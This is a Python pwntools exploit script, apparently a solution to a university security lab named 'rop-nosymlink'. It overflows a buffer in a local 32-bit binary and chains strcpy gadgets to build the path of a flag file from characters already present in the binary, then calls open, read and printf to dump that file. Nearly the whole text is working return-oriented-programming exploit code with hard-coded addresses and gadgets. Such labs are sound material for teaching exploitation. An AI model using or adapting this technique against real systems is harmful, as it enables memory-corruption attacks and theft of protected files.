#!/usr/bin/env python

from pwn import *

p = process("./rop-nosymlink-32")

strcpy = p.elf.symbols['strcpy']
_open = p.elf.symbols['open']
read = p.elf.symbols['read']
printf = p.elf.symbols['printf']

alphabet = 'the quick brown fox jumps over the lazy dog!'
numbers = 'I also put this for you: 1234567890-'

def get_alphabet_address(ch):
    idx = alphabet.find(ch)
    return 0x8048768 + idx

def get_numbers(ch):
    idx = numbers.find(ch)
    return 0x8048798 + idx

slash = 0x80487e0

target_path = '/home/blue9057/dev/cs519-fall2018/lab/week6/rop-nosymlink/flag-32'

#0x08048738 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
ppppr = 0x8048738
pppr = 0x8048739
ppr = 0x804873a
pr = 0x804873b

payload = "A" * (0x88 + 4)

addr_buffer = 0x804a02c

idx = 0
for c in target_path:
    payload += p32(strcpy) + p32(ppr) + p32(addr_buffer + idx)
    if c == '/':
        payload += p32(slash)
    elif c in '1234567890-':
        payload += p32(get_numbers(c))
    else:
        payload += p32(get_alphabet_address(c))
    idx += 1

payload +=  p32(strcpy) + p32(ppr) + p32(addr_buffer + len(target_path)) + \
            p32(slash+1)

payload += p32(_open) + p32(ppr) + p32(addr_buffer) + p32(0)
payload += p32(read) + p32(printf) + p32(3) + p32(addr_buffer) + p32(100)

with open('exploit.txt','wb') as f:
    f.write(payload)

p.sendline(payload)

p.interactive()
